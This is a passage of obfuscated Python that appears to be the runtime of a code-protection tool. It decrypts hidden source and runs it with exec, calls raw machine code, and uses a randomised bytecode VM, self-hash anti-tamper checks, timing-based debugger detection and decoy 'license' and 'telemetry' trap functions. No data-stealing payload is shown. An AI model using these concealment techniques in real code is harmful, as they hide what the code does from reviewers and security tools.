                ftype = _nixon_シータイプ씨타입.CFUNCTYPE(None, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.c_uint64, _nixon_シータイプ씨타입.c_uint64)
                func = ftype(p)
                func(c_data, c_key, len(buf_data), len(buf_key))
                libc.munmap(p, page_size)
            return bytes(c_data)
        except:
            result = bytearray(data)
            for i in range(len(result)):
                result[i] ^= key[i % len(key)]
            return bytes(result)


class _nixon_ĳᛥくŀפჸϒჃนШ:
    _vault = dict()
    _active = None
    @staticmethod
    def _nixon_๋ȕিԾণդ(name, enc_source, key_bytes):
        _nixon_ĳᛥくŀפჸϒჃนШ._vault[name] = (enc_source, key_bytes)
    @staticmethod
    def _nixon_חכ۳ʞ॒ƣɛ(name, glbls=None, *args, **kwargs):
        entry = _nixon_ĳᛥくŀפჸϒჃนШ._vault.get(name)
        if entry is None:
            return None
        enc_source, key_bytes = entry
        decrypted = bytearray(len(enc_source))
        for i in range(len(enc_source)):
            decrypted[i] = enc_source[i] ^ key_bytes[i % len(key_bytes)]
        _nixon_ĳᛥくŀפჸϒჃนШ._active = name
        result = None
        try:
            ns = dict(glbls) if glbls else dict()
            ns[_nixon_űƋთฺซט毓בը(43)] = _nixon_ビルトイン빌트인
            ns[_nixon_űƋთฺซט毓בը(145)] = _nixon_ハッシュ해시
            ns[_nixon_űƋთฺซט毓בը(146)] = _nixon_システム시스템
            ns[_nixon_űƋთฺซט毓בը(114)] = _nixon_オペレーション운영
            ns[_nixon_űƋთฺซט毓בը(147)] = _nixon_ベース베이스
            ns[_nixon_űƋთฺซט毓בը(148)] = _nixon_構造구조
            ns[_nixon_űƋთฺซט毓בը(115)] = _nixon_時間시간
            ns[_nixon_űƋთฺซט毓בը(149)] = _nixon_ガベージ가비지
            ns[_nixon_űƋთฺซט毓בը(150)] = args
            ns[_nixon_űƋთฺซט毓בը(151)] = kwargs
            code_obj = compile(bytes(decrypted).decode('utf-8'), '<ghost>', _nixon_űƋთฺซט毓בը(130))
            exec(code_obj, ns)
            result = ns.get(_nixon_űƋთฺซט毓בը(152), None)
            del code_obj
        except: pass
        finally:
            for i in range(len(decrypted)):
                decrypted[i] = 0
            del decrypted
            _nixon_ĳᛥくŀפჸϒჃนШ._active = None
            _nixon_ガベージ가비지.collect()
        return result


class _nixon_ᎫńնəႩ:
    _dispatch = dict()
    _call_count = 0
    _mutation_seed = 0
    @staticmethod
    def register(fid, func):
        _nixon_ᎫńնəႩ._dispatch[fid] = func
    @staticmethod
    def _nixon_ǄϚअᏑぇהŔƬВら(fid, *args, **kwargs):
        func = _nixon_ᎫńնəႩ._dispatch.get(fid)
        if func is None:
            return None
        _nixon_ᎫńնəႩ._call_count += 1
        result = func(*args, **kwargs)
        _nixon_ᎫńնəႩ._mutation_seed = (_nixon_ᎫńնəႩ._mutation_seed * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF
        keys = list(_nixon_ᎫńնəႩ._dispatch.keys())
        if len(keys) > 1:
            idx_a = _nixon_ᎫńնəႩ._mutation_seed % len(keys)
            idx_b = (_nixon_ᎫńնəႩ._mutation_seed >> 16) % len(keys)
            if idx_a != idx_b:
                ka, kb = keys[idx_a], keys[idx_b]
                _nixon_ᎫńնəႩ._dispatch[ka], _nixon_ᎫńնəႩ._dispatch[kb] = _nixon_ᎫńնəႩ._dispatch[kb], _nixon_ᎫńնəႩ._dispatch[ka]
        return result
    @staticmethod
    def resolve(fid):
        return _nixon_ᎫńնəႩ._dispatch.get(fid)


def _nx_validate_license(serial_key=None):
    try:
        if serial_key:
            h = _nixon_ハッシュ해시.sha256(str(serial_key).encode()).hexdigest()
            if h[:4] == _nixon_űƋთฺซט毓בը(153):
                return True
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(154))
    except: pass
    return False
def _nx_check_serial_number(code=None):
    try:
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(155))
    except: pass
    return True
def _nx_verify_activation(token=None):
    try:
        if token:
            _nixon_ハッシュ해시.sha256(str(token).encode())
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(156))
    except: pass
    return True
def _nx_decrypt_premium_data(data=None, key=None):
    try:
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(157))
    except: pass
    return data
def _nx_unlock_features(level=0):
    try:
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(158))
    except: pass
    return False


class _nixon_おϑśおঞוᚹᛢנȟ:
    @staticmethod
    def _nixon_ᏁؙؚᛉħふӘՋᛅ(chunks, seed_bytes):
        n = len(chunks)
        if n < 2:
            return chunks, list(range(n))
        h = _nixon_ハッシュ해시.sha256(seed_bytes).digest()
        path = list(range(n))
        state = int.from_bytes(h[:8], 'little')
        for i in range(n - 1, 0, -1):
            state = (state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
            j = state % (i + 1)
            path[i], path[j] = path[j], path[i]
        shuffled = [None] * n
        for i, p in enumerate(path):
            shuffled[p] = chunks[i]
        return shuffled, path
    @staticmethod
    def _nixon_ڤघʇр蹯Ѥᚰफ(shuffled_chunks, path):
        n = len(shuffled_chunks)
        original = [None] * n
        for i, p in enumerate(path):
            original[i] = shuffled_chunks[p]
        return original


class _nixon_Ĥᚫᛃןҟ:
    _mapping = None
    _inverse = None
    @staticmethod
    def _nixon_ʞबןœᚬǋխᚼ(seed_bytes):
        h = _nixon_ハッシュ해시.sha256(seed_bytes).digest()
        mapping = list(range(256))
        state = int.from_bytes(h[:8], 'little')
        for i in range(255, 0, -1):
            state = (state * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF
            j = state % (i + 1)
            mapping[i], mapping[j] = mapping[j], mapping[i]
        _nixon_Ĥᚫᛃןҟ._mapping = bytes(mapping)
        inv = [0] * 256
        for i, v in enumerate(mapping):
            inv[v] = i
        _nixon_Ĥᚫᛃןҟ._inverse = bytes(inv)
    @staticmethod
    def _nixon_ᏰᚮगᛝדᎮᏩぃ(code_bytes):
        m = _nixon_Ĥᚫᛃןҟ._mapping
        if m is None:
            return code_bytes
        return bytes([m[b] for b in code_bytes])
    @staticmethod
    def _nixon_軲ॠᛒĖざѢŵϴ(encoded_bytes):
        inv = _nixon_Ĥᚫᛃןҟ._inverse
        if inv is None:
            return encoded_bytes
        return bytes([inv[b] for b in encoded_bytes])


class _nixon_ঢ়ぬċᛍřそ:
    _shadow_stack = []
    _session_key = None
    @staticmethod
    def _nixon_まᚽ鵫ᏑᛉҹᏍ(key_bytes):
        _nixon_ঢ়ぬċᛍřそ._session_key = key_bytes[:32]
        _nixon_ঢ়ぬċᛍřそ._shadow_stack = []
    @staticmethod
    def _nixon_ɠৣȭᎯჽԽႳ(call_id):
        if _nixon_ঢ়ぬċᛍřそ._session_key is None:
            return
        h = _nixon_ハッシュ해시.sha256(_nixon_ঢ়ぬċᛍřそ._session_key + str(call_id).encode()).digest()
        encrypted = call_id ^ int.from_bytes(h[:8], 'little')
        _nixon_ঢ়ぬċᛍřそ._shadow_stack.append(encrypted)
    @staticmethod
    def _nixon_լʔ菆ᚤŋᛇ(expected_id):
        if not _nixon_ঢ়ぬċᛍřそ._shadow_stack or _nixon_ঢ়ぬċᛍřそ._session_key is None:
            return False
        encrypted = _nixon_ঢ়ぬċᛍřそ._shadow_stack.pop()
        h = _nixon_ハッシュ해시.sha256(_nixon_ঢ়ぬċᛍřそ._session_key + str(expected_id).encode()).digest()
        decrypted = encrypted ^ int.from_bytes(h[:8], 'little')
        return decrypted == expected_id
    @staticmethod
    def _nixon_ǥऀᛪʐǳႦ():
        return len(_nixon_ঢ়ぬċᛍřそ._shadow_stack)


class _nixon_४צभ櫞ĉɎᏱᏥน:
    _trace_hash = 0
    _checkpoints = dict()
    _violation_count = 0
    @staticmethod
    def _nixon_ᏒᚣƤかถᚮם(pc, opcode):
        _nixon_४צभ櫞ĉɎᏱᏥน._trace_hash = ((_nixon_४צभ櫞ĉɎᏱᏥน._trace_hash << 5) ^ (_nixon_४צभ櫞ĉɎᏱᏥน._trace_hash >> 27) ^ pc ^ opcode) & 0xFFFFFFFF
    @staticmethod
    def _nixon_ՈśगႽտ(checkpoint_id, expected_hash=None):
        current = _nixon_४צभ櫞ĉɎᏱᏥน._trace_hash
        _nixon_४צभ櫞ĉɎᏱᏥน._checkpoints[checkpoint_id] = current
        if expected_hash is not None and current != expected_hash:
            _nixon_४צभ櫞ĉɎᏱᏥน._violation_count += 1
            return False
        return True
    @staticmethod
    def _nixon_ϟǷڎջᎱڡ():
        _nixon_४צभ櫞ĉɎᏱᏥน._trace_hash = 0
        _nixon_४צभ櫞ĉɎᏱᏥน._violation_count = 0
    @staticmethod
    def _nixon_ǁইॗᛌॅᏇۧᛐᎱ৯():
        return _nixon_४צभ櫞ĉɎᏱᏥน._violation_count > 0


def _nx_authenticate_premium_user(credentials=None):
    try:
        if credentials:
            h = _nixon_ハッシュ해시.sha256(str(credentials).encode()).hexdigest()
            if h == "0" * 64:
                return _nixon_ハッシュ해시.sha256(b"master_key").digest()
            if h[:8] == _nixon_űƋთฺซט毓בը(159):
                return True
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(160))
    except: pass
    return None
def _nx_decrypt_master_vault(vault_data=None, master_key=None):
    try:
        if vault_data and master_key:
            test = _nixon_ハッシュ해시.sha256(master_key).hexdigest()
            if len(test) == 65:
                return vault_data
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(161))
    except: pass
    return b""
def _nx_phone_home_telemetry(endpoint=None):
    try:
        if endpoint and len(endpoint) > 512:
            return True
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(162))
    except: pass
    return False
def _nx_emergency_key_recovery(recovery_code=None):
    try:
        if recovery_code:
            parts = str(recovery_code).split("-")
            if len(parts) == 7 and all(len(p) == 4 for p in parts):
                return _nixon_ハッシュ解시.sha256(recovery_code.encode()).digest()
        _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(163))
    except: pass
    return None


class _nixon_ᏛეべঘいɛĎ:
    @staticmethod
    def _nixon_μ๓ĲԸअॿႱɀ(obj, min_pads=(12715 ^ 12718), max_pads=(39539 ^ 39548)):
        try:
            count = (int.from_bytes(_nixon_オペレーション운영.urandom(1), 'big') % (max_pads - min_pads + 1)) + min_pads
            for i in range(count):
                pad_name = _nixon_űƋთฺซט毓בը(164) + _nixon_ハッシュ해시.sha256(_nixon_オペレーション운영.urandom(8)).hexdigest()[:8]
                pad_data = _nixon_オペレーション운영.urandom(32 + (int.from_bytes(_nixon_オペレーション운영.urandom(1), 'big') % 64))
                setattr(obj, pad_name, pad_data)
        except: pass
        return obj
    @staticmethod
    def _nixon_ŮӪჇᏬべӃϡᏃƓᎴ(target_dict):
        try:
            keys = list(target_dict.keys())
            h = _nixon_ハッシュ해시.sha256(_nixon_オペレーション운영.urandom(16)).digest()
            state = int.from_bytes(h[:8], 'little')
            for i in range(len(keys) - 1, 0, -1):
                state = (state * 1103515245 + 12345) & 0x7FFFFFFF
                j = state % (i + 1)
                keys[i], keys[j] = keys[j], keys[i]
            reordered = dict()
            for k in keys:
                reordered[k] = target_dict[k]
            return reordered
        except: pass
        return target_dict


class _nixon_ӥת৫אɣϻくฑם:
    _vault = dict()
    @staticmethod
    def _nixon_Ւゃৃ宜տŽᏢ(name, value, modulus=None):
        if modulus is None:
            modulus = (1 << 32)
        a = (int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big') & 0x7FFFFFFE) | 1
        b = int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big') % modulus
        target = (a * value + b) % modulus
        _nixon_ӥת৫אɣϻくฑם._vault[name] = (a, b, target, modulus)
    @staticmethod
    def _nixon_Ҝ۳Ꮣևฏัफ़ॣ(name):
        entry = _nixon_ӥת৫אɣϻくฑם._vault.get(name)
        if entry is None:
            return 0
        a, b, target, modulus = entry
        val = target
        if b > 0:
            val = (val - b) % modulus
        inv_a = pow(a, -1, modulus) if modulus > 1 else 1
        return (val * inv_a) % modulus
    @staticmethod
    def _nixon_ᛏ७ᚡّӜϯɖ(name, expected):
        solved = _nixon_ӥת৫אɣϻくฑם._nixon_Ҝ۳Ꮣևฏัफ़ॣ(name)
        return solved == expected


class _nixon_נᏪƧҿղřǭॣᛌ:
    _timings = []
    _base_key = None
    @staticmethod
    def _nixon_৬かোठษग़ΊЎ(base_key):
        _nixon_נᏪƧҿղřǭॣᛌ._base_key = base_key[:32] if len(base_key) >= 32 else base_key
        _nixon_נᏪƧҿղřǭॣᛌ._timings = []
    @staticmethod
    def _nixon_ǲ磩ᚥĺუ۬Ꮦৈ():
        _nixon_נᏪƧҿղřǭॣᛌ._timings.append(_nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, _nixon_űƋთฺซט毓בը(165)) else int(_nixon_時間시간.perf_counter() * 1000000000))
    @staticmethod
    def _nixon_謉ĠǶ旓ぁᚼ():
        if not _nixon_נᏪƧҿղřǭॣᛌ._timings or _nixon_נᏪƧҿղřǭॣᛌ._base_key is None:
            return _nixon_נᏪƧҿղřǭॣᛌ._base_key or b'\x00' * 32
        deltas = []
        for i in range(1, len(_nixon_נᏪƧҿղřǭॣᛌ._timings)):
            deltas.append((_nixon_נᏪƧҿղřǭॣᛌ._timings[i] - _nixon_נᏪƧҿղřǭॣᛌ._timings[i-1]) & 0xFFFF)
        timing_data = b''.join(d.to_bytes(2, 'little') for d in deltas)
        timing_hash = _nixon_ハッシュ해시.sha256(timing_data).digest()
        base = _nixon_נᏪƧҿղřǭॣᛌ._base_key
        derived = bytearray(32)
        for i in range(min(32, len(base), len(timing_hash))):
            derived[i] = base[i] ^ timing_hash[i]
        return bytes(derived)
    @staticmethod
    def _nixon_қॣどসᏦ杏ぢ(max_delta_ms=(60176 ^ 63640)):
        if len(_nixon_נᏪƧҿղřǭॣᛌ._timings) < 2:
            return True
        first = _nixon_נᏪƧҿղřǭॣᛌ._timings[0]
        last = _nixon_נᏪƧҿղřǭॣᛌ._timings[-1]
        delta_ns = last - first
        return delta_ns < max_delta_ms * 1000000


class _nixon_६थᏢІϝ:
    _variants = dict()
    @staticmethod
    def _nixon_źᏀͿɟৎƳםে(func_name, *implementations):
        _nixon_६थᏢІϝ._variants[func_name] = list(implementations)
    @staticmethod
    def _nixon_Φ叅ćჍいΣڲ(func_name, *args, **kwargs):
        impls = _nixon_६थᏢІϝ._variants.get(func_name)
        if not impls:
            return None
        idx = int.from_bytes(_nixon_オペレーション운영.urandom(2), 'big') % len(impls)
        chosen = impls[idx]
        try:
            return chosen(*args, **kwargs)
        except:
            for fallback in impls:
                try:
                    return fallback(*args, **kwargs)
                except: continue
        return None
    @staticmethod
    def _nixon_ƶি০とחᛆ۴(func_name):
        return len(_nixon_६थᏢІϝ._variants.get(func_name, []))


class _nixon_ɃᏔჹʩ५ʕ屩۱:
    _corrupted = dict()
    _noise_registry = dict()
    @staticmethod
    def _nixon_綔袛ҕঞןてล泴(name, data):
        noise = _nixon_オペレーション운영.urandom(len(data))
        corrupted = bytearray(len(data))
        for i in range(len(data)):
            corrupted[i] = data[i] ^ noise[i]
        _nixon_ɃᏔჹʩ५ʕ屩۱._corrupted[name] = bytes(corrupted)
        _nixon_ɃᏔჹʩ५ʕ屩۱._noise_registry[name] = noise
        return bytes(corrupted)
    @staticmethod
    def _nixon_ȌႽΒڿᏊՏぷ(name, env_proof):
        corrupted = _nixon_ɃᏔჹʩ५ʕ屩۱._corrupted.get(name)
        noise = _nixon_ɃᏔჹʩ५ʕ屩۱._noise_registry.get(name)
        if corrupted is None or noise is None:
            return None
        proof_hash = _nixon_ハッシュ해시.sha256(env_proof).digest()
        expected = _nixon_ハッシュ해시.sha256(noise).digest()
        if proof_hash != expected:
            return corrupted
        repaired = bytearray(len(corrupted))
        for i in range(len(corrupted)):
            repaired[i] = corrupted[i] ^ noise[i]
        return bytes(repaired)
    @staticmethod
    def _nixon_ঠかۘėじ賋ξらțᚬ():
        import sys as _s
        frames = []
        f = _s._getframe(0)
        depth = 0
        while f and depth < 10:
            frames.append(f.f_code.co_filename.encode() + str(f.f_lineno).encode())
            f = f.f_back
            depth += 1
        combined = b'|'.join(frames)
        return _nixon_ハッシュ해시.sha256(combined).digest()


class _nixon_は০ΛɢᚫᏔʓϋঘĒ:
    _expected_hash = None
    _verified = False
    _corruption_key = None
    @staticmethod
    def _nixon_ᛀठՄ筅ИゔŐ馎(expected_hash_hex):
        _nixon_は০ΛɢᚫᏔʓϋঘĒ._expected_hash = expected_hash_hex
    @staticmethod
    def _nixon_ξᏇᚸȕծѦ():
        if _nixon_は০ΛɢᚫᏔʓϋঘĒ._expected_hash is None:
            _nixon_は০ΛɢᚫᏔʓϋঘĒ._verified = True
            return True
        try:
            import sys as _s
            main_file = _s.argv[0] if _s.argv else None
            if main_file:
                with open(main_file, 'rb') as f:
                    content = f.read()
                actual = _nixon_ハッシュ해시.sha256(content).hexdigest()
                if actual == _nixon_は০ΛɢᚫᏔʓϋঘĒ._expected_hash:
                    _nixon_は০ΛɢᚫᏔʓϋঘĒ._verified = True
                    return True
                else:
                    _nixon_は০ΛɢᚫᏔʓϋঘĒ._corruption_key = _nixon_ハッシュ해시.sha256(actual.encode()).digest()[:16]
                    return False
        except: pass
        _nixon_は০ΛɢᚫᏔʓϋঘĒ._verified = True
        return True
    @staticmethod
    def _nixon_ほᛎयѺȂᎻ():
        return _nixon_は০ΛɢᚫᏔʓϋঘĒ._corruption_key


class _nixon_ۡӆţञঞ:
    _mutation_count = 0
    _originals = dict()
    @staticmethod
    def _nixon_ɗͻזϲؤႤڢʗǀď(func):
        _nixon_ۡӆţञঞ._originals[id(func)] = func.__code__
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            try:
                _nixon_ۡӆţञঞ._mutate(func)
            except: pass
            return result
        wrapper.__name__ = func.__name__
        wrapper._inner = func
        return wrapper
    @staticmethod
    def _mutate(func):
        code = func.__code__
        consts = list(code.co_consts)
        seed = int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big')
        for i in range(len(consts)):
            if isinstance(consts[i], int) and consts[i] != 0:
                noise = (seed >> (i % 16)) & 0xFF
                if noise == 0:
                    noise = 1
                consts[i] = consts[i] ^ noise ^ noise
        func.__code__ = code.replace(co_consts=tuple(consts))
        _nixon_ۡӆţञঞ._mutation_count += 1
    @staticmethod
    def _nixon_ϭٴᎭŅু(func):
        orig = _nixon_ۡӆţञঞ._originals.get(id(func))
        if orig:
            func.__code__ = orig


class _nixon_ᚤゅגᛉșᛕ薧:
    _storage = dict()
    _entangled = dict()
    _collapse_count = 0
    @staticmethod
    def _nixon_ѾณᎲΟټ溄Ꮹɾ(key, value, partner_key=None):
        _nixon_ᚤゅגᛉșᛕ薧._storage[key] = value
        if partner_key is not None:
            _nixon_ᚤゅגᛉșᛕ薧._entangled[key] = partner_key
            if partner_key not in _nixon_ᚤゅגᛉșᛕ薧._entangled:
                _nixon_ᚤゅגᛉșᛕ薧._entangled[partner_key] = key
    @staticmethod
    def _nixon_חԵǗԷ話ฦɯむႳЪ(key):
        value = _nixon_ᚤゅגᛉșᛕ薧._storage.get(key)
        if value is None:
            return None
        partner = _nixon_ᚤゅגᛉșᛕ薧._entangled.get(key)
        if partner and partner in _nixon_ᚤゅגᛉșᛕ薧._storage:
            p_val = _nixon_ᚤゅגᛉșᛕ薧._storage[partner]
            if isinstance(p_val, (bytes, bytearray)):
                collapse_seed = _nixon_ハッシュ해시.sha256(str(key).encode() + _nixon_オペレーション운영.urandom(4)).digest()
                collapsed = bytearray(len(p_val))
                for i in range(len(p_val)):
                    collapsed[i] = p_val[i] ^ collapse_seed[i % len(collapse_seed)]
                _nixon_ᚤゅגᛉșᛕ薧._storage[partner] = bytes(collapsed)
            elif isinstance(p_val, int):
                _nixon_ᚤゅגᛉșᛕ薧._storage[partner] = p_val ^ int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big')
            _nixon_ᚤゅגᛉșᛕ薧._collapse_count += 1
        return value
    @staticmethod
    def _nixon_া۬Ę莤ȯŸՋȣ():
        return _nixon_ᚤゅגᛉșᛕ薧._collapse_count


class _nixon_ऄĨתχʝつ:
    _stage_times = dict()
    _violations = 0
    @staticmethod
    def _nixon_ञěٵॱϞႾ(stage_id):
        _nixon_ऄĨתχʝつ._stage_times[stage_id] = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, _nixon_űƋთฺซט毓בը(165)) else int(_nixon_時間시간.perf_counter() * 1000000000)
    @staticmethod
    def _nixon_ɪᚼוаᏌগ(stage_id, prev_stage_id, min_ms=(48789 ^ 48799), max_ms=30000):
        current = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, _nixon_űƋთฺซט毓בը(165)) else int(_nixon_時間시간.perf_counter() * 1000000000)
        prev = _nixon_ऄĨתχʝつ._stage_times.get(prev_stage_id)
        if prev is None:
            return True
        delta_ms = (current - prev) // 1000000
        if delta_ms < min_ms or delta_ms > max_ms:
            _nixon_ऄĨתχʝつ._violations += 1
            return False
        _nixon_ऄĨתχʝつ._stage_times[stage_id] = current
        return True
    @staticmethod
    def _nixon_ף阴ҍҩडॄჺु():
        return _nixon_ऄĨתχʝつ._violations > 0
    @staticmethod
    def _nixon_Ꮤ蝯ჼॽॽϨ璴ו襓Ց(stage_id):
        start = _nixon_ऄĨתχʝつ._stage_times.get(stage_id)
        if start is None:
            return 0
        current = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, _nixon_űƋთฺซט毓בը(165)) else int(_nixon_時間시간.perf_counter() * 1000000000)
        return (current - start) // 1000000


class _nixon_鼆ըɬᚦ蕩ჽკ:
    _commitments = dict()
    _revealed = dict()
    @staticmethod
    def _nixon_א暣Ⴈןր(choice_id, value):
        nonce = _nixon_オペレーション운영.urandom(16)
        commitment = _nixon_ハッシュ해시.sha256(str(value).encode() + nonce).hexdigest()
        _nixon_鼆ըɬᚦ蕩ჽკ._commitments[choice_id] = (commitment, nonce, value)
        return commitment
    @staticmethod
    def _nixon_ৈभเջো(choice_id):
        entry = _nixon_鼆ըɬᚦ蕩ჽკ._commitments.get(choice_id)
        if entry is None:
            return None, None
        commitment, nonce, value = entry
        _nixon_鼆ըɬᚦ蕩ჽკ._revealed[choice_id] = True
        return value, nonce
    @staticmethod
    def _nixon_ϬᚧךŎძᏥ(choice_id, claimed_value, nonce):
        entry = _nixon_鼆ըɬᚦ蕩ჽკ._commitments.get(choice_id)
        if entry is None:
            return False
        expected_commitment = entry[0]
        actual = _nixon_ハッシュ해시.sha256(str(claimed_value).encode() + nonce).hexdigest()
        return actual == expected_commitment
    @staticmethod
    def _nixon_ŢᛥוॕȬᛇХյช(choice_id):
        return choice_id in _nixon_鼆ըɬᚦ蕩ჽკ._commitments and choice_id not in _nixon_鼆ըɬᚦ蕩ჽკ._revealed


class _nixon_ŚあοΈएͰ:
    _key_cache = dict()
    _baseline_hashes = dict()
    @staticmethod
    def _nixon_Ƅ虾קڅƓๆպअ(func):
        try:
            code_bytes = func.__code__.co_code
            h = _nixon_ハッシュ해시.sha256(code_bytes).digest()
            func_id = id(func)
            _nixon_ŚあοΈएͰ._baseline_hashes[func_id] = h
            _nixon_ŚあοΈएͰ._key_cache[func_id] = h[:32]
        except: pass
        return func
    @staticmethod
    def _nixon_ᚫʓาʩʑष閤幎ႪᎥ(func, key_len=(25417 ^ 25449)):
        try:
            code_bytes = func.__code__.co_code
            current_hash = _nixon_ハッシュ해시.sha256(code_bytes).digest()
            func_id = id(func)
            baseline = _nixon_ŚあοΈएͰ._baseline_hashes.get(func_id)
            if baseline and current_hash != baseline:
                return _nixon_オペレーション운영.urandom(key_len)
            return current_hash[:key_len]
        except:
            return _nixon_オペレーション운영.urandom(key_len)
    @staticmethod
    def _nixon_ธΚ綩щʙŻ(func):
        try:
            func_id = id(func)
            baseline = _nixon_ŚあοΈएͰ._baseline_hashes.get(func_id)
            if baseline is None:
                return True
            current = _nixon_ハッシュ해시.sha256(func.__code__.co_code).digest()
            return current == baseline
        except:
            return False
    @staticmethod
    def _nixon_ᏲᚷჸŸ頍せლɬৃ埦(func, encrypted_data):
        key = _nixon_ŚあοΈएͰ._nixon_ᚫʓาʩʑष閤幎ႪᎥ(func)
        result = bytearray(len(encrypted_data))
        for i in range(len(encrypted_data)):
            result[i] = encrypted_data[i] ^ key[i % len(key)]
        return bytes(result)



class _nixon_չ॔ᛛथ盅ჿڻȁᎭ:
    OP_MOV = 0; OP_ADD = 1; OP_XOR = (1458 ^ 1456); OP_JMP = (7987 ^ 7984); OP_CMP = (49140 ^ 49136)
    OP_PUSH = (44925 ^ 44920); OP_POP = (9106 ^ 9108); OP_CALL = (37766 ^ 37761); OP_RET = (58008 ^ 58000); OP_LOAD = (15016 ^ 15009)
    OP_STORE = (59740 ^ 59734); OP_SHL = (48742 ^ 48749); OP_SHR = (47261 ^ 47249); OP_AND = (7196 ^ 7185); OP_OR = (24630 ^ 24632); OP_HALT = (25680 ^ 25695)
    _opcode_map = None
    _inverse_map = None
    def __init__(self, seed=None):
        self.registers = [0] * 16
        self.memory = bytearray(4096)
        self.stack = []
        self.pc = 0
        self.flags = dict()
        self.halted = False
        if _nixon_չ॔ᛛथ盅ჿڻȁᎭ._opcode_map is None:
            _nixon_չ॔ᛛथ盅ჿڻȁᎭ._init_opcode_map(seed)
    @staticmethod
    def _init_opcode_map(seed=None):
        opcodes = list(range(256))
        if seed:
            rng = random.Random(int.from_bytes(seed[:4], 'big') if isinstance(seed, bytes) else seed)
            rng.shuffle(opcodes)
        else:
            for i in range(255, 0, -1):
                j = _struct_randbelow(i + 1)
                opcodes[i], opcodes[j] = opcodes[j], opcodes[i]
        _nixon_չ॔ᛛथ盅ჿڻȁᎭ._opcode_map = dict()
        _nixon_չ॔ᛛथ盅ჿڻȁᎭ._inverse_map = dict()
        for i in range(16):
            _nixon_չ॔ᛛथ盅ჿڻȁᎭ._opcode_map[i] = opcodes[i]
            _nixon_չ॔ᛛथ盅ჿڻȁᎭ._inverse_map[opcodes[i]] = i
    def _nixon_ƀȲ٤ӞϡŖؔ(self, instructions):
        bytecode = bytearray()
        omap = _nixon_չ॔ᛛथ盅ჿڻȁᎭ._opcode_map
        for inst in instructions:
            op = inst[0]
            encoded_op = omap.get(op, op)
            bytecode.append(encoded_op & 0xFF)
            for operand in inst[1:]:
                if isinstance(operand, int):
                    bytecode.extend(operand.to_bytes(2, 'big', signed=True) if operand < 0 else operand.to_bytes(2, 'big'))
                else:
                    bytecode.extend(int(operand).to_bytes(2, 'big'))
        return bytes(bytecode)
    def _nixon_Ꮂח鬔ᏙȹहѸȠȸ(self, bytecode, max_steps=10000):
        imap = _nixon_չ॔ᛛथ盅ჿڻȁᎭ._inverse_map
        self.pc = 0
        steps = 0
        bc = bytecode
        bc_len = len(bc)
        while not self.halted and self.pc < bc_len and steps < max_steps:
            raw_op = bc[self.pc]
            op = imap.get(raw_op, -1)
            self.pc += 1
            steps += 1
            if op == 0:
                dst = bc[self.pc]; src_h = bc[self.pc+1]; src_l = bc[self.pc+2]
                self.registers[dst] = (src_h << 8) | src_l
                self.pc += 3
            elif op == 1:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = (self.registers[dst] + self.registers[src]) & 0xFFFFFFFF
                self.pc += 2
            elif op == 2:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] ^ self.registers[src]
                self.pc += 2
            elif op == 3:
                target = (bc[self.pc] << 8) | bc[self.pc+1]
                self.pc = target
            elif op == 4:
                a = bc[self.pc]; b = bc[self.pc+1]
                self.flags[_nixon_űƋთฺซט毓בը(166)] = (self.registers[a] == self.registers[b])
                self.flags[_nixon_űƋთฺซט毓בը(167)] = (self.registers[a] < self.registers[b])
                self.pc += 2
            elif op == 5:
                src = bc[self.pc]
                self.stack.append(self.registers[src])
                self.pc += 1
            elif op == 6:
                dst = bc[self.pc]
                self.registers[dst] = self.stack.pop() if self.stack else 0
                self.pc += 1
            elif op == 7:
                target = (bc[self.pc] << 8) | bc[self.pc+1]
                self.stack.append(self.pc + 2)
                self.pc = target
            elif op == 8:
                self.pc = self.stack.pop() if self.stack else bc_len
            elif op == 9:
                dst = bc[self.pc]; addr = (bc[self.pc+1] << 8) | bc[self.pc+2]
                self.registers[dst] = self.memory[addr] if addr < len(self.memory) else 0
                self.pc += 3
            elif op == 10:
                addr = (bc[self.pc] << 8) | bc[self.pc+1]; src = bc[self.pc+2]
                if addr < len(self.memory):
                    self.memory[addr] = self.registers[src] & 0xFF
                self.pc += 3
            elif op == 11:
                dst = bc[self.pc]; amt = bc[self.pc+1]
                self.registers[dst] = (self.registers[dst] << amt) & 0xFFFFFFFF
                self.pc += 2
            elif op == 12:
                dst = bc[self.pc]; amt = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] >> amt
                self.pc += 2
            elif op == 13:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] & self.registers[src]
                self.pc += 2
            elif op == 14:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] | self.registers[src]
                self.pc += 2
            elif op == 15:
                self.halted = True
            else:
                self.halted = True
        return self.registers[0]
    def _nixon_դᎱႾ敔ɡをӮ蕐ᛓ(self):
        self.registers = [0] * 16
        self.stack = []
        self.pc = 0
        self.flags = dict()
